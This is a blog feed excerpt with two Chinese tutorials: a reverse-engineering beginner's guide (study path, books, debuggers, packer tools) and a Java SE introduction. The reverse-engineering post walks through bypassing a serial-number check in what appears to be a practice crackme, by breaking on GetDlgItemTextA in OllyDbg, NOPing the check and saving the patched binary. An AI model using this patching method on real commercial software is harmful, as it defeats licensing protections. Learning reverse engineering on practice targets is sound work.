        <content type="html"><![CDATA[<h1>第一章 概述</h1><p>学了几个月的逆向，记得10月份国庆节刚开始学的时候 感觉找flag蛮有意思，看着一个up主的视频，那时候c语言也没怎么学，所以就单纯他怎么做，我自己怎么做，后面去一些ctf靶场做了几道题，除了最基础的那几道题，其他的根本看不懂，后面实验室问了一个在我心中最牛师傅，推荐我去看一个滴水逆向的视频，他叫我耐心看，我其实看了10多集吧，一集2个多小时，感觉讲的真的好，可惜就相当于那种听懂但就是模拟模糊的感觉，后面我自己去找了很多逆向的视频，也看了很多，确实学到了一点东西，感觉还是没学到啥，后面看了一些大佬的学习路线，也看了一些大佬的警言，一定要坚持下去，逆向入门门槛确实很高</p><p>一个大佬的原话： 学技术的道路注定是枯燥无味的，而且也会有很多坑，摔惨了，出来了就成为了强者，出不来，就断了自己学技术的路</p><p>刚开始我还不明白这句话，最近真的就突然悟通了，里面有很多无底洞和坑出不来就凉了</p><p>分享一种学习方法（递归学习）简单说一下就是，哪里不会就去找哪里不会，如果另一个地方不会，</p><p>就去找另一个地方不会的点，这个方法适用于大部分学习（比如高数等等）</p><h2 id="1-需要的基础（没有基础那就学）">1. 需要的基础（没有基础那就学）</h2><ol><li><p>正向编程！！！必须会c，函数不一定全部都要记住，常见的记住即可，记不住的上网查，查多了就会慢慢熟悉了，还有一门必须精通的编程语言（一个最多只会写base64的菜鸡。。。。写到这里好想笑）</p></li><li><p>汇编，刚开始大概了解就行，我其实才知道10个汇编，似乎可以看懂一丢丢了，还是一样的不知道就查</p></li><li><p>PE/ELF文件结构</p></li><li><p>坚持下去</p><p>逆向学累了，可以从正向编程找个项目做做，建个小站玩玩，写点博客等等，其实最值得建议的事情是还是建议大家多多运动，出去旅行，看点电影，听听音乐，别TM把自己卷死了，再次申明一下，我一点都不卷！！！我只是知道在正确的时间，做正确的事而已</p></li></ol><h2 id="2-书籍推荐">2. 书籍推荐</h2><ol><li>《加密与解密4》</li><li>《逆向工程原理》</li><li>《IDA权威指南》我看了10几页，看不下去了，原来翻译。。。。这可是图灵系列的书。。。。</li></ol><h2 id="3-工具（缺少找啥）">3. 工具（缺少找啥）</h2><ol><li><p>ida和od还有x32/64dbg必备不多说</p></li><li><p>还有很多工具，查壳（exeinfore,peid,die64）和脱壳(fupx,upx umpacker)刚开始入门upx压缩壳较多，其他壳遇到再找工具吧，吾爱虚拟机里面有很多脱壳查壳的软件</p></li><li><p>随波逐流CTF编码工具！！！（如果早有这个，我觉得我可以节省很多时间）</p></li><li><p>linux里面带插件的gdb（peda,gef,pwndbg）这个我在介绍pwn工具里面写了教程，想安装的话可以去看</p><p>链接链接：<a href="https://pan.baidu.com/s/1QNxkUTB-s8_CTImTUe5erQ">https://pan.baidu.com/s/1QNxkUTB-s8_CTImTUe5erQ</a><br>提取码：n56s</p></li></ol><h2 id="来一个实战爆破然后开始入坑">来一个实战爆破然后开始入坑</h2><p>先跟着爆破，原理后面去搞懂0x01 首先，我们拿到一个软件，先查壳，</p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105150726321.png" alt="image-20220105150726321"></p><p>0x02 用exeinfope查壳<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105150853423.png" alt="image-20220105150853423"></p><p>0x03 无壳，其他东西是pe文件的东西（现在先不管，跟着一起破解）</p><p>0x04 打开程序看一下是什么<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105151106901.png" alt="image-20220105151106901"></p><p>0x05 就是一个验证账号密码的窗口</p><p>0x06 我们拖进od里面进行爆破<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105151430345.png" alt="image-20220105151430345"></p><p>0x07 会停到55开头</p><p>0x08 然后ctrl + G输入GetDlgItemTextA找到程序调用的api信息窗口函数<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105155012912.png" alt="image-20220105155012912"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105154819467.png" alt="image-20220105154819467"></p><p>0x09 然后F8一直步过断下；来输入，随便输入什么，我输入用户名thestar0，序列号就是密码我输入123456<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105155119485.png" alt="image-20220105155119485"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105155826146.png" alt="image-20220105155826146"></p><p>0x0A 然后停到这个地方，这时候我们一步步步过，注意od信息窗口<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105160228347.png" alt="image-20220105160228347"><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105160335044.png" alt="image-20220105160335044"><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105160426528.png" alt="image-20220105160426528"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105160607540.png" alt="image-20220105160607540"></p><p>0x0B 双击汇编窗口或点击空格键，NOP汇编即可，后面我们一直F8到验证窗口即可成功，为了让我们下次直接成功我们需要保存一下<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105161915897.png" alt="image-20220105161915897"><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105162003805.png" alt="image-20220105162003805"></p><p>0x0C 右键复制可执行文件选择<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105162112381.png" alt="image-20220105162112381"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105162246097.png" alt="image-20220105162246097"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220105162320598.png" alt="image-20220105162320598"></p><p>好了，这就是爆破，来理一下要学什么，首先，od那些窗口是什么要认识吧，断点会下吧，那个api函数要知道吧，其实有四个api消息窗口函数（可以去加密与解密4里面看一下），还有查壳会看吧，其实也多少，建议看一下加密与解密4一二章，这些大部分就明白了，其实这里面有贼多的细节加密与解密里面都有，看完就豁然开朗了，小甲鱼视频里面也有这个程序的爆破，这个提兴趣应该可以吧</p><h1>第二章 基础篇</h1><p>后续更新</p><h1>第三章 调试篇</h1><p>后续更新</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaSE（一）</title>
      <link href="//6689abbf.html"/>
      <url>//6689abbf.html</url>
      
        <content type="html"><![CDATA[<h1><strong>第一章 java概述</strong></h1><h2 id="1-1-Java重要特点"><strong>1.1 Java重要特点</strong></h2><ol><li><p>Java 语言是==面向对象==的(oop)</p></li><li><p>Java 语言是健壮的。Java 的强类型机制、异常处理、垃圾的自动收集等是 Java 程序健壮性的重要保证</p></li><li><p>Java 语言是==跨平台性==的。[即: 一个编译好的.class 文件可以在多个系统下运行，这种特性称为跨平台]<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103223603067.png" alt="image-20220103223603067"></p></li><li><p>Java 语言是解释型的[了解]</p><p>解释性语言：javascript,PHP, java</p><p>编译性语言: c / c++</p><p>区别是：</p><p>解释性语言:编译后的代码，不能直接被机器执行,需要解释器来执行,</p><p>编译性语言: 编译后的代码, 可以直接被机器执行, c /c++</p></li><li><p>java开发工具：<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103224132063.png" alt="image-20220103224132063"></p></li></ol><p>​太基础建议sublime,notepad++,后面使用idea,eclipse或者建议网上在线编译器，比如菜鸟教程</p><h2 id="1-2-Java-运行机制及运行过程"><strong>1.2 Java 运行机制及运行过程</strong></h2><ol><li>Java 语言的特点：==跨平台性==</li></ol><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103224544411.png" alt="image-20220103224544411"></p><ol><li><p>Java 核心机制-Java 虚拟机 [ JVM 其全称为 java virtual machine]</p></li><li><p>JVM虚拟机介绍</p><p>​JVM 是一个虚拟的计算机，具有指令集并使用不同的存储区域。负责执行指令，管理数据、内存、寄存器，包含在 JDK 中</p><p>​对于不同的平台，有不同的虚拟机（Windows，Linux，Macos）如下图</p><p>​Java 虚拟机机制屏蔽了底层运行平台的差别，实现了==一次编译，到处运行==</p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103224927702.png" alt="image-20220103224927702"></p></li></ol><h2 id="1-3-什么是JDK，JRE？"><strong>1.3 什么是JDK，JRE？</strong></h2><ol><li><p>JDK 基本介绍</p><p>​JDK 的全称(Java Development Kit Java 开发工具包)</p><p>JDK = JRE + java 的开发工具 [java, javac,javadoc,javap 等]</p><p>​JDK 是提供给 Java 开发人员使用的，其中包含了 java 的开发工具，也包括了 JRE。所以安装了 JDK，就不用在单独 安装 JRE 了</p></li><li><p>JRE 基本介绍</p><p>JRE (Java Runtime Environment Java 运行环境)</p></li></ol><p>​  ==JRE = JVM + Java 的核心类库[类]==</p><p>​  所以</p><p>​==JDK =  JVM + Java 的核心类库[类] + java 的开发工具 [java, javac,javadoc,javap 等]==</p><p>​如果想要运行一个开发好的 Java 程序， 计算机中只需要安装 JRE 即可</p><ol start="3"><li><p>JDK、JRE 和 JVM 的包含关系</p><p>​ JDK = JRE + 开发工具集（例如 Javac,java 编译工具等)</p><p>​ JRE = JVM + Java SE 标准类库（java 核心类库）</p><p>​如果只想运行开发好的 .class 文件 只需要 JRE</p></li></ol><h2 id="1-4-JDK的安装和下载"><strong>1.4 JDK的安装和下载</strong></h2><ol><li>首先去官网下载JDK<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103230320107.png" alt=""></li></ol><p>就是这个网站进去</p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103230512970.png" alt="image-20220103230512970"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103230553787.png" alt="image-20220103230553787"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103230619647.png" alt="image-20220103230619647"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103230711569.png" alt="image-20220103230711569"></p><p>这里下载最新版jdk17不过建议学习的时候用jdk8或者jdk11,因为上班用这些</p><p>下载安装即可，JDK8，JDK11下载也和这个一样，注意windows系统就行</p><p>安装界面一直点就行</p><ol start="2"><li><p>配置JDK的环境</p><p><img src="C:%5CUsers%5C28418%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220103231056561.png" alt=""></p></li></ol><p>这个选中此电脑右键点击属性</p><p><img src="C:%5CUsers%5C28418%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220103231137302.png" alt="image-20220103231137302"></p><p>可能有的小伙伴是win10，道理是一样的找到这个高级系统设置就行</p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103231308384.png" alt="image-20220103231308384"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103231354996.png" alt="image-20220103231354996"></p><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103231535046.png" alt="image-20220103231535046"></p><p>新建然后输入之前安装jdk路径的bin文件路径复制粘贴到新建的那里面，我已经弄完了如上图所示<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103231830700.png" alt="image-20220103231830700"></p><p>然后确认即可</p><p>怎么知道我们配置成功了呢? 按win加R输入cmd打开命令行输入java -version有个1.8这个就表示成功我用的JDK8 所以显示的是1.8<img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220103232022426.png" alt="image-20220103232022426"></p><h2 id="1-5-java转义字符"><strong>1.5 java转义字符</strong></h2><p>\t ：一个制表位，实现对齐的功能</p><p>\n ：换行符</p><p>\ ：一个\</p><p>\ &quot;  :一个&quot;</p><p>\ ’ ：一个’</p><p>\ r :一个回车</p><h2 id="1-6java注释"><strong>1.6java注释</strong></h2><ul><li><p>注释： 用于注解说明解释程序的文字就是注释，注释提高了代码的阅读性（可读性）；</p></li><li><p>注释是一个程序员必须要具有的良 好编程习惯。将自己的思想通过注释先整理出来，再用代码去体现。</p></li><li><p>Java 中的注释类型</p><ul><li>单行注释 格式： //注释文字</li><li>多行注释 格式： /* 注释文字 */</li><li>文档注释  格式： /**注释文字 */</li></ul></li><li><p>注释使用细节</p><ul><li>被注释的文字，不会被 JVM（java 虚拟机）解释执行</li><li>多行注释里面不允许有多行注释嵌套</li><li>文档注释细节：注释内容可以被JDK提供的工具javadoc所解析，生成一套以网页文件形式体现的改程序的说明文档，一般写在类</li></ul></li></ul><h2 id="1-7-Java代码规范"><strong>1.7 Java代码规范</strong></h2><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220106191414051.png" alt="image-20220106191414051"></p><h2 id="1-8-第一个程序"><strong>1.8 第一个程序</strong></h2><p>配置完可以去找一个编译器，自己敲第一个java程序</p><p>或者去网上找在线编译器也可以（推荐菜鸟教程）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;i love java&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1><strong>第二章 变量与运算符</strong></h1><h2 id="1-1-变量"><strong>1.1 变量</strong></h2><ul><li>变量相当于内存中一个数据存储空间的表示，你可以把变量看做是一个房间的门牌号，通过门牌号我们可以找到房 间，而通过变量名可以访问到变量(值)。</li><li>具体使用步骤<ul><li>声明变量 比如int a;</li><li>变量赋值 比如a = 10;</li><li>也可以同时声明赋值 比如int a = 10;</li></ul></li><li>使用注意事项</li></ul><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220106192056094.png" alt="image-20220106192056094"></p><h2 id="1-2-程序中-号的使用"><strong>1.2 程序中 +号的使用</strong></h2><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220106193400631.png" alt="image-20220106193400631"></p><h2 id="1-3-8种基本数据类型3种引用类型"><strong>1.3 8种基本数据类型3种引用类型</strong></h2><ul><li>每一种数据都定义了明确的数据类型，在内存中分配了不同大小的内存空间(字节)。</li><li>java数据类型</li></ul><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220106193641932.png" alt="image-20220106193641932"></p><ul><li>java 数据类型分为两大类<ul><li>. 基本数据类型有 8 种 数值型 byte , short , int , long , float ,double] char , boolean</li><li>引用类型三种 类，接口，数组</li></ul></li></ul><h3 id="1-整数类型">1. 整数类型</h3><ol><li>基本介绍 Java 的整数类型就是用于存放整数值的，比如 12 , 30, 3456 ……</li><li>整形的类型</li></ol><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220106194848720.png" alt="image-20220106194848720"></p><ol><li>整型的使用细节</li></ol><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220106194938777.png" alt="image-20220106194938777"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Text</span> </span>&#123;</span><br><span class="line"><span class="comment">//编写一个 main 方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//Java 的整型常量（具体值）默认为 int 型，声明 long 型常量须后加‘l’或‘L’</span></span><br><span class="line"><span class="keyword">int</span> n1 = <span class="number">1</span>;<span class="comment">//4 个字节</span></span><br><span class="line"><span class="comment">//int n2 = 1L;//对不对?不对</span></span><br><span class="line"><span class="keyword">long</span> n3 = <span class="number">1L</span>;<span class="comment">//对</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-浮点类型">2. 浮点类型</h3><ol><li>基本介绍Java 的浮点类型可以表示一个小数，比如 123.4 ，7.8 ，0.12 ……</li><li>浮点类型的分类</li></ol><p><img src="https://gitee.com/thestar0/tuchuang/raw/master/img/image-20220106200619163.png" alt="image-20220106200619163"></p><ol><li>说明<ul><li>关于浮点数在机器中存放形式的简单说明,浮点数=符号位+指数位+尾数位</li><li>尾数部分可能丢失，造成精度损失(小数都是近似值)。</li></ul></li><li>使用细节</li></ol><p><img src="https://raw.githubusercontent.com/thestar0/tuchuang/master/img/image-20220106200906902.png" alt="image-20220106200906902"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
